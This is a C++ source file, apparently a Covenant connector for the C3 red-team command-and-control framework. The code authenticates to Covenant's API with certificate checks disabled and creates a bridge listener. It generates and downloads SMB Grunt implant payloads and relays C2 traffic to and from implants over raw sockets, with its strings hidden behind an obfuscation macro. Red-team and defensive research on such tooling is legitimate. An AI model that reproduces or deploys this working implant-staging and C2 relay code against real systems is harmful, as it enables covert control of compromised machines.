#include "StdAfx.h"
#include "Common/FSecure/Sockets/SocketsException.h"
#include "Common/json/json.hpp"
#include "Common/CppRestSdk/include/cpprest/http_client.h"
#include "Common/FSecure/Crypto/Base64.h"
#include "Common/FSecure/CppTools/Compression.h"

using json = nlohmann::json;

namespace FSecure::C3::Interfaces::Connectors
{
	/// A class representing communication with Covenant.
	struct Covenant : Connector<Covenant>
	{
		/// Public constructor.
		/// @param arguments factory arguments.
		Covenant(ByteView arguments);

		/// A public destructor.
		~Covenant();

		/// OnCommandFromConnector callback implementation.
		/// @param binderId Identifier of Peripheral who sends the Command.
		/// @param command full Command with arguments.
		void OnCommandFromBinder(ByteView binderId, ByteView command) override;

		/// Processes internal (C3 API) Command.
		/// @param command a buffer containing whole command and it's parameters.
		/// @return command result.
		ByteVector OnRunCommand(ByteView command) override;

		/// Called every time new implant is being created.
		/// @param connectionId adders of Grunt in C3 network .
		/// @param data parameters used to create implant. If payload is empty, new one will be generated.
		/// @param isX64 indicates if relay staging beacon is x64.
		/// @returns ByteVector correct command that will be used to stage beacon.
		ByteVector PeripheralCreationCommand(ByteView connectionId, ByteView data, bool isX64) override;

		/// Return json with commands.
		/// @return Capability description in JSON format.
		static const char* GetCapability();

	private:
		/// Represents a single C3 <-> Covenant connection, as well as each Grunt in network.
		struct Connection : std::enable_shared_from_this<Connection>
		{
			/// Constructor.
			/// @param listeningPostAddress adders of Bridge.
			/// @param listeningPostPort port of Bridge.
			/// @param owner weak pointer to Covenant class.
			/// @param id id used to address Grunt.
			Connection(std::string_view listeningPostAddress, uint16_t listeningPostPort, std::weak_ptr<Covenant> owner, std::string_view id = ""sv);

			/// Destructor.
			~Connection();

			/// Sends data directly to Covenant.
			/// @param data buffer containing blob to send.
			/// @remarks throws FSecure::WinSocketsException on WinSockets error.
			void Send(ByteView data);

			/// Creates the receiving thread.
			/// As long as connection is alive detached thread will pull available data Covenant.
			void StartUpdatingInSeparateThread();

			/// Reads data from Socket.
			/// @return heartbeat read data.
			ByteVector Receive();

			/// Indicates that receiving thread was already started.
			/// @returns true if receiving thread was started, false otherwise.
			bool SecondThreadStarted();

		private:
			/// Pointer to TeamServer instance.
			std::weak_ptr<Covenant> m_Owner;

			/// A socket object used in communication with the Bridge listener.
			SOCKET m_Socket;

			/// RouteID in binary form. Address of beacon in network.
			ByteVector m_Id;

			/// Indicates that receiving thread was already started.
			bool m_SecondThreadStarted = false;
		};

		/// Retrieves grunt payload from Covenant using the API.
		/// @param binderId address of beacon in network.
		/// @param pipename name of pipe hosted by the SMB Grunt.
		/// @param delay number of seconds for SMB grunt to block for
		/// @param jitter percent to jitter the delay by
		/// @param listenerId the id of the Bridge listener for covenant
		/// @return generated payload.
		FSecure::ByteVector GeneratePayload(ByteView binderId, std::string automaticExecution, std::string gruntType, std::string netFramework, std::string pipename, uint32_t delay, uint32_t jitter, uint32_t connectAttempts);

		/// Close desired connection
		/// @arguments arguments for command. connection Id in string form.
		/// @returns ByteVector empty vector.
		FSecure::ByteVector CloseConnection(ByteView arguments);

		/// Initializes Sockets library. Can be called multiple times, but requires corresponding number of calls to DeinitializeSockets() to happen before closing the application.
		/// @return value forwarded from WSAStartup call (zero if successful).
		static int InitializeSockets();

		/// Deinitializes Sockets library.
		/// @return true if successful, otherwise WSAGetLastError might be called to retrieve specific error number.
		static bool DeinitializeSockets();

		/// IP Address of Bridge Listener.
		std::string m_ListeningPostAddress;

		/// Port of Bridge Listener.
		uint16_t m_ListeningPostPort;

		///Covenant host for web API
		std::string m_webHost;

		///Covenant username
		std::string m_username;

		///Covenant password
		std::string m_password;

		///API token, generated on logon.
		std::string m_token;

		///member for listener
		int m_ListenerId;

		int m_LauncherId;

		/// Access mutex for m_ConnectionMap.
		std::mutex m_ConnectionMapAccess;

		/// Access mutex for sending data to Covenant.
		std::mutex  m_SendMutex;

		/// Map of all connections.
		std::unordered_map<std::string, std::shared_ptr<Connection>> m_ConnectionMap;

		bool CreateListener();

		bool UpdateListenerId();

		bool UpdateLauncherId(std::string gruntType);
	};
}

bool FSecure::C3::Interfaces::Connectors::Covenant::UpdateListenerId()
{
	std::string url = this->m_webHost + OBF("/api/listeners");
	std::pair<std::string, uint16_t> data;
	json response;

	web::http::client::http_client_config config;
	config.set_validate_certificates(false); //Covenant framework is unlikely to have a valid cert.

	web::http::client::http_client webClient(utility::conversions::to_string_t(url), config);
	web::http::http_request request;

	request = web::http::http_request(web::http::methods::GET);

	std::string authHeader = OBF("Bearer ") + this->m_token;
	request.headers().add(OBF(L"Authorization"), utility::conversions::to_string_t(authHeader));
	pplx::task<web::http::http_response> task = webClient.request(request);

	web::http::http_response resp = task.get();

	if (resp.status_code() != web::http::status_codes::OK)
		throw std::exception((OBF("[Covenant] Error getting Listeners, HTTP resp: ") + std::to_string(resp.status_code())).c_str());

	//Get the json response
	auto respData = resp.extract_string();
	response = json::parse(respData.get());

	for (auto& listeners : response)
	{
		if (listeners[OBF("name")] != OBF("C3Bridge"))
			continue;

		this->m_ListenerId = listeners[OBF("id")].get<int>();
		this->m_ListeningPostAddress = listeners[OBF("connectAddresses")][0].get<std::string>();
		this->m_ListeningPostPort = listeners[OBF("connectPort")];
		return true;
	}

	return false; //we didn't find the listener
}

bool FSecure::C3::Interfaces::Connectors::Covenant::CreateListener()
{
	std::string url;
	web::http::client::http_client_config config;
	web::http::http_request request;
	std::string authHeader;
	json createBridgeData;
	json response;
	pplx::task<web::http::http_response> task;
	web::http::http_response resp;

	// Listener API URL
	url = this->m_webHost + OBF("/api/listeners/bridge");
	authHeader = OBF("Bearer ") + this->m_token;

	//Covenant framework is unlikely to have a valid cert.
	config.set_validate_certificates(false);

	web::http::client::http_client webClient(utility::conversions::to_string_t(url), config);

	//If the listener doesn't already exist create it.
	if (!UpdateListenerId())
	{
		//extract ip address from url
		size_t start = 0, end = 0;
		start = url.find("://") + 3;
		end = url.find(":", start + 1);

		if (start == std::string::npos || end == std::string::npos || end > url.size())
			throw std::exception(OBF("[Covenenat] Incorrect URL, must be of the form http|https://hostname|ip:port - eg https://192.168.133.171:7443"));

		this->m_ListeningPostAddress = url.substr(start, end - start);

		///Create the bridge listener
		request = web::http::http_request(web::http::methods::POST);
		request.headers().set_content_type(utility::conversions::to_string_t(OBF("application/json")));
		request.headers().add(OBF(L"Authorization"), utility::conversions::to_string_t(authHeader));

		// Create request body
		createBridgeData[OBF("Id")] = 0;
		createBridgeData[OBF("Name")] = OBF("C3Bridge");
		createBridgeData[OBF("GUID")] = OBF("b85ea642f2");
		createBridgeData[OBF("description")] = OBF("A Bridge for custom listeners.");
		createBridgeData[OBF("bindAddress")] = OBF("0.0.0.0");
		createBridgeData[OBF("bindPort")] = this->m_ListeningPostPort;
		createBridgeData[OBF("ConnectAddresses")] = { this->m_ListeningPostAddress };
		createBridgeData[OBF("ConnectPort")] = this->m_ListeningPostPort;
		createBridgeData[OBF("ProfileId")] = 3;
		createBridgeData[OBF("ListenerTypeId")] = 2;
		createBridgeData[OBF("Status")] = OBF("Active");
		request.set_body(utility::conversions::to_string_t(createBridgeData.dump()));

		task = webClient.request(request);
		resp = task.get();

		if (resp.status_code() != web::http::status_codes::OK)
			throw std::exception((OBF("[Covenant] Error setting up BridgeListener, HTTP resp: ") + std::to_string(resp.status_code())).c_str());

		if (!UpdateListenerId()) //now get the id of the listener
			throw std::exception((OBF("[Covenant] Error getting ListenerID after creation")));
	}
	return true;
}

bool FSecure::C3::Interfaces::Connectors::Covenant::UpdateLauncherId(std::string gruntType)
{
	std::string url = this->m_webHost + OBF("/api/launchers");
	json response;

	web::http::client::http_client_config config;
	config.set_validate_certificates(false); //Covenant framework is unlikely to have a valid cert.

	web::http::client::http_client webClient(utility::conversions::to_string_t(url), config);
	web::http::http_request request;

	request = web::http::http_request(web::http::methods::GET);

	std::string authHeader = OBF("Bearer ") + this->m_token;
	request.headers().add(OBF(L"Authorization"), utility::conversions::to_string_t(authHeader));
	pplx::task<web::http::http_response> task = webClient.request(request);

	web::http::http_response resp = task.get();

	if (resp.status_code() != web::http::status_codes::OK)
		throw std::exception((OBF("[Covenant] Error getting Launchers, HTTP resp: ") + std::to_string(resp.status_code())).c_str());

	//Get the json response
	auto respData = resp.extract_string();
	response = json::parse(respData.get());

	for (auto& launchers : response)
	{
		if (launchers[OBF("name")] != OBF("C3SMB") + gruntType)
			continue;

		this->m_LauncherId = launchers[OBF("id")].get<int>();
		return true;
	}

	return false; //we didn't find the launcher
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::C3::Interfaces::Connectors::Covenant::Covenant(ByteView arguments)
{
	json postData;
	json response;

	std::tie(m_ListeningPostPort, m_webHost, m_username, m_password) = arguments.Read<uint16_t, std::string, std::string, std::string>();

	// if the last character is '/' remove it
	if (this->m_webHost.back() == '/')
		this->m_webHost.pop_back();


	/***Authenticate to Web API ***/
	std::string url = this->m_webHost + OBF("/api/users/login");

	postData[OBF("username")] = this->m_username;
	postData[OBF("password")] = this->m_password;

	web::http::client::http_client_config config;
	config.set_validate_certificates(false); //Covenant framework is unlikely to have a valid cert.

	web::http::client::http_client webClient(utility::conversions::to_string_t(url), config);
	web::http::http_request request;

	request = web::http::http_request(web::http::methods::POST);
	request.headers().set_content_type(utility::conversions::to_string_t(OBF("application/json")));
	request.set_body(utility::conversions::to_string_t(postData.dump()));

	pplx::task<web::http::http_response> task = webClient.request(request);
	web::http::http_response resp = task.get();

	if (resp.status_code() == web::http::status_codes::OK)
	{
		//Get the json response
		auto respData = resp.extract_string();
		response = json::parse(respData.get());
	}
	else
		throw std::exception((OBF("[Covenant] Error authenticating to web app, HTTP resp: ") + std::to_string(resp.status_code())).c_str());

	//Get the token to be used for all other requests.
	if (response[OBF("success")])
		this->m_token = response[OBF("covenantToken")].get<std::string>();
	else
		throw std::exception(OBF("[Covenant] Could not get token, invalid logon"));

	// Create bridge listener
	if (!CreateListener()) {
		throw std::exception((OBF("[Covenant] Error creating bridge listener")));
	}

	//Set the listening address to the C2-Bridge on localhost
	// TODO: Understand why they use static local IP
	// this->m_ListeningPostAddress = "127.0.0.1";
	InitializeSockets();
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::C3::Interfaces::Connectors::Covenant::~Covenant()
{
	DeinitializeSockets();
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void FSecure::C3::Interfaces::Connectors::Covenant::OnCommandFromBinder(ByteView binderId, ByteView command)
{
	std::scoped_lock<std::mutex> lock(m_ConnectionMapAccess);

	auto it = m_ConnectionMap.find(binderId);
	if (it == m_ConnectionMap.end())
		throw std::runtime_error{ OBF("Unknown connection") };

	if (!(it->second->SecondThreadStarted()))
		it->second->StartUpdatingInSeparateThread();

	it->second->Send(command);
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
int FSecure::C3::Interfaces::Connectors::Covenant::InitializeSockets()
{
	WSADATA wsaData;
	WORD wVersionRequested;
	wVersionRequested = MAKEWORD(2, 2);
	return WSAStartup(wVersionRequested, &wsaData);
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
bool FSecure::C3::Interfaces::Connectors::Covenant::DeinitializeSockets()
{
	return WSACleanup() == 0;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteVector FSecure::C3::Interfaces::Connectors::Covenant::GeneratePayload(ByteView binderId, std::string automaticExecution, std::string gruntType, std::string netFramework, std::string pipename, uint32_t delay, uint32_t jitter, uint32_t connectAttempts)
{
	if (binderId.empty() || pipename.empty())
		throw std::runtime_error{ OBF("Wrong parameters, cannot create payload") };

	if ("false" == automaticExecution)
	{
		auto connection = std::make_shared<Connection>(m_ListeningPostAddress, m_ListeningPostPort, std::static_pointer_cast<Covenant>(shared_from_this()), binderId);
		m_ConnectionMap.emplace(std::string{ binderId }, std::move(connection));
		return ByteVector();
	}

	std::string authHeader = OBF("Bearer ") + this->m_token;
	std::string contentHeader = OBF("Content-Type: application/json");
	//std::string binary;
	FSecure::ByteVector::Super binary;


	web::http::client::http_client_config config;
	config.set_validate_certificates(false);

	web::http::http_request request;
	pplx::task<web::http::http_response> task;
	web::http::http_response resp;

	request.headers().set_content_type(utility::conversions::to_string_t(OBF("application/json")));
	request.headers().add(OBF(L"Authorization"), utility::conversions::to_string_t(authHeader));

	// Get GruntSMB template ID
	uint32_t gruntSmbTemplateId = -1;
	web::http::client::http_client implantWebClient(utility::conversions::to_string_t(this->m_webHost + OBF("/api/implanttemplates/")), config);
	request.set_method(web::http::methods::GET);
	task = implantWebClient.request(request);
	resp = task.get();
	if (resp.status_code() != web::http::status_codes::OK)
		throw std::exception((OBF("[Covenant] Error getting implant templates, HTTP resp: ") + std::to_string(resp.status_code())).c_str());

	//Get the json response
	auto respData = resp.extract_string();
	json response = json::parse(respData.get());

	for (auto& implantTemplate : response)
	{
		if (implantTemplate[OBF("name")] != OBF("GruntSMB"))
			continue;
		gruntSmbTemplateId = implantTemplate[OBF("id")];
		break;
	}
	if (-1 == gruntSmbTemplateId)
	{
		throw std::exception((OBF("[Covenant] Error finding GruntSMB template")));

	}

	//The data to create an SMB Grunt
	std::string gruntApi = OBF("/api/launchers/") + gruntType;
	web::http::client::http_client webClient(utility::conversions::to_string_t(this->m_webHost + gruntApi), config);
	// Update Grunt data to current
	json postData;
	postData[OBF("listenerId")] = this->m_ListenerId;
	postData[OBF("implantTemplateId")] = gruntSmbTemplateId;
	postData[OBF("Name")] = OBF("C3SMB") + gruntType;
	postData[OBF("type")] = gruntType;
	postData[OBF("description")] = OBF("A SMB Launcher for C3Bridge Listener.");

	postData[OBF("dotNetVersion")] = netFramework;
	postData[OBF("smbPipeName")] = pipename;
	postData[OBF("delay")] = delay;
	postData[OBF("jitterPercent")] = jitter;
	postData[OBF("connectAttempts")] = connectAttempts;
	//postData[OBF("outputKind")] = OBF("ConsoleApplication");

	if (!UpdateLauncherId(gruntType))
	{
		///	Create Launcher if it doesn't exists

		request.set_method(web::http::methods::POST);
		request.set_body(utility::conversions::to_string_t(postData.dump()));

		task = webClient.request(request);
		resp = task.get();

		if (resp.status_code() != web::http::status_codes::OK)
			throw std::exception((OBF("[Covenant] Error setting up Launcher, HTTP resp: ") + std::to_string(resp.status_code())).c_str());

		if (!UpdateLauncherId(gruntType)) //now get the id of the launcher
			throw std::exception((OBF("[Covenant] Error getting LauncherID after creation")));
	}

	// Update postData to relevant launcher
	postData[OBF("id")] = this->m_LauncherId;

	try
	{
		// Update launcher details.
		request.set_method(web::http::methods::PUT);
		request.headers().set_content_type(utility::conversions::to_string_t("application/json"));
		request.set_body(utility::conversions::to_string_t(postData.dump()));

		task = webClient.request(request);
		resp = task.get();

		//If we get 200 OK, then we use a POST to request the generation of the payload. We can reuse the previous data here.
		if (resp.status_code() == web::http::status_codes::OK)
		{
			web::http::client::http_client webClient(utility::conversions::to_string_t(this->m_webHost + OBF("/api/launchers/") + std::to_string(this->m_LauncherId) + OBF("/download")), config);
			request.set_method(web::http::methods::GET);
			request.headers().set_content_type(utility::conversions::to_string_t("application/octet-stream"));
			task = webClient.request(request);
			resp = task.get();

			if (resp.status_code() == web::http::status_codes::OK)
			{
				auto respData = resp.extract_vector();
				binary = respData.get();
			}
			else
				throw std::runtime_error(OBF("[Covenant] Non-200 HTTP code returned: ") + std::to_string(resp.status_code()));
		}
		else
			throw std::runtime_error(OBF("[Covenant] Non-200 HTTP code returned: ") + std::to_string(resp.status_code()));

		auto payload = binary;

		//Finally connect to the socket.
		auto connection = std::make_shared<Connection>(m_ListeningPostAddress, m_ListeningPostPort, std::static_pointer_cast<Covenant>(shared_from_this()), binderId);
		m_ConnectionMap.emplace(std::string{ binderId }, std::move(connection));
		return payload;
	}
	catch (std::exception&)
	{
		throw std::exception(OBF("Error generating payload"));
	}
}

FSecure::ByteVector FSecure::C3::Interfaces::Connectors::Covenant::CloseConnection(ByteView arguments)
{
	m_ConnectionMap.erase(arguments);
	return {};
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteVector FSecure::C3::Interfaces::Connectors::Covenant::OnRunCommand(ByteView command)
{
	auto commandCopy = command;
	switch (command.Read<uint16_t>())
	{
		//	case 0:
		//		return GeneratePayload(command);
	case 1:
		return CloseConnection(command);
	default:
		return AbstractConnector::OnRunCommand(commandCopy);
	}
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
const char* FSecure::C3::Interfaces::Connectors::Covenant::GetCapability()
{
	return R"(
	{
	"create":
	{
		"arguments":
		[
			{
				"type": "uint16",
				"name": "C2BridgePort",
				"min": 2,
				"defaultValue": 8000,
				"randomize": true,
				"description": "The port for the C2Bridge Listener if it doesn't already exist."
			},
			{
				"type": "string",
				"name": "Covenant Web Host",
				"min": 1,
				"defaultValue": "https://127.0.0.1:7443/",
				"description": "Host for Covenant - eg https://127.0.0.1:7443/"
			},
			{
				"type": "string",
				"name": "Username",
				"min": 1,
				"description": "Username to authenticate"
			},
			{
				"type": "string",
				"name": "Password",
				"min": 1,
				"description": "Password to authenticate"
			}
		]
	},
	"commands":
	[
		{
			"name": "Close connection",
			"description": "Close socket connection with TeamServer if beacon is not available",
			"id": 1,
			"arguments":
			[
				{
					"name": "Route Id",
					"min": 1,
					"description": "Id associated to beacon"
				}
			]
		}
	]
}
)";
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::C3::Interfaces::Connectors::Covenant::Connection::Connection(std::string_view listeningPostAddress, uint16_t listeningPostPort, std::weak_ptr<Covenant> owner, std::string_view id)
	: m_Owner(owner)
	, m_Id(ByteView{ id })
{

	/*** Connect to C2Bridge ***/
	sockaddr_in client;
	client.sin_family = AF_INET;
	client.sin_port = htons(listeningPostPort);
	switch (InetPtonA(AF_INET, &listeningPostAddress.front(), &client.sin_addr.s_addr))									//< Mod to solve deprecation issue.
	{
	case 0:
		throw std::invalid_argument(OBF("Provided Listening Post address in not a valid IPv4 dotted - decimal string or a valid IPv6 address."));
	case -1:
		throw FSecure::SocketsException(OBF("Couldn't convert standard text IPv4 or IPv6 address into its numeric binary form. Error code : ") + std::to_string(WSAGetLastError()) + OBF("."), WSAGetLastError());
	}

	// Attempt to connect.
	if (INVALID_SOCKET == (m_Socket = socket(AF_INET, SOCK_STREAM, 0)))
		throw FSecure::SocketsException(OBF("Couldn't create socket."), WSAGetLastError());

	if (SOCKET_ERROR == connect(m_Socket, (struct sockaddr*)&client, sizeof(client)))
		throw FSecure::SocketsException(OBF("Could not connect to ") + std::string{ listeningPostAddress } + OBF(":") + std::to_string(listeningPostPort) + OBF("."), WSAGetLastError());

}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::C3::Interfaces::Connectors::Covenant::Connection::~Connection()
{
	closesocket(m_Socket);
}


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void FSecure::C3::Interfaces::Connectors::Covenant::Connection::Send(ByteView data)
{
	auto owner = m_Owner.lock();
	if (!owner)
		throw std::runtime_error(OBF("Could not lock pointer to owner "));

	std::unique_lock<std::mutex> lock{ owner->m_SendMutex };

	auto unpacked = Compression::Decompress<Compression::Deflate>(data);

	//Format the length to match how it is read by Covenant.
	DWORD length = static_cast<DWORD>(unpacked.size());
	BYTE* bytes = (BYTE*)&length;
	DWORD32 chunkLength = (bytes[0] << 24) + (bytes[1] << 16) + (bytes[2] << 8) + bytes[3];

	// Write four bytes indicating the length of the next chunk of data.
	if (SOCKET_ERROR == send(m_Socket, (char*)&chunkLength, 4, 0))
		throw FSecure::SocketsException(OBF("Error sending to Socket : ") + std::to_string(WSAGetLastError()) + OBF("."), WSAGetLastError());

	// Write the chunk to socket.
	DWORD total_bytes_sent = 0;
	while (total_bytes_sent < length)
	{
		DWORD current_bytes_sent = send(m_Socket, (char*)&unpacked.front(), length, 0);
		if (SOCKET_ERROR == current_bytes_sent)
			throw FSecure::SocketsException(OBF("Error sending payload to Socket : ") + std::to_string(WSAGetLastError()) + OBF("."), WSAGetLastError());
		total_bytes_sent += current_bytes_sent;
	}


}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteVector FSecure::C3::Interfaces::Connectors::Covenant::Connection::Receive()
{
	DWORD chunkLength = 0, bytesRead;
	if (SOCKET_ERROR == (bytesRead = recv(m_Socket, reinterpret_cast<char*>(&chunkLength), 4, 0)))
		throw FSecure::SocketsException(OBF("Error receiving from Socket : ") + std::to_string(WSAGetLastError()) + ("."), WSAGetLastError());

	if (!bytesRead || !chunkLength)
		return {};																										//< The connection has been gracefully closed.

	//Format the length to match how it is written by Covenant.
	BYTE* bytes = (BYTE*)&chunkLength;
	DWORD32 len = (bytes[0] << 24) + (bytes[1] << 16) + (bytes[2] << 8) + bytes[3];

	// Read in the result.
	ByteVector buffer;
	buffer.resize(len);
	for (DWORD bytesReadTotal = 0; bytesReadTotal < len; bytesReadTotal += bytesRead)
		switch (bytesRead = recv(m_Socket, reinterpret_cast<char*>(&buffer[bytesReadTotal]), len - bytesReadTotal, 0))
		{
		case 0:
			return {};																									//< The connection has been gracefully closed.

			case static_cast<DWORD>(SOCKET_ERROR) :
				throw FSecure::SocketsException(OBF("Error receiving from Socket : ") + std::to_string(WSAGetLastError()) + OBF("."), WSAGetLastError());
		}

	return Compression::Compress<Compression::Deflate>(buffer);
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void FSecure::C3::Interfaces::Connectors::Covenant::Connection::StartUpdatingInSeparateThread()
{
	m_SecondThreadStarted = true;
	std::thread([this]()
		{
			// Lock pointers.
			auto owner = m_Owner.lock();
			auto bridge = owner->GetBridge();
			auto self = shared_from_this();
			while (bridge->IsAlive() && self.use_count() > 1)
			{
				try
				{
					// Read packet and post it to Binder.
					if (auto packet = Receive(); !packet.empty())
					{
						if (packet.size() == 1u && packet[0] == 0u)
							Send(packet);
						else
							bridge->PostCommandToBinder(ByteView{ m_Id }, packet);
					}
				}
				catch (std::exception& e)
				{
					bridge->Log({ e.what(), LogMessage::Severity::Error });
				}
			}
		}).detach();
}

bool FSecure::C3::Interfaces::Connectors::Covenant::Connection::SecondThreadStarted()
{
	return m_SecondThreadStarted;
}

FSecure::ByteVector FSecure::C3::Interfaces::Connectors::Covenant::PeripheralCreationCommand(ByteView connectionId, ByteView data, bool isX64)
{
	auto [automaticExecution, gruntType, netFramework, pipeName, delay, jitter, connectAttempts] = data.Read<std::string, std::string, std::string, std::string, uint32_t, uint32_t, uint32_t>();


	return ByteVector{}.Write(automaticExecution, gruntType, pipeName, GeneratePayload(connectionId, automaticExecution, gruntType, netFramework, pipeName, delay, jitter, connectAttempts), connectAttempts);
}


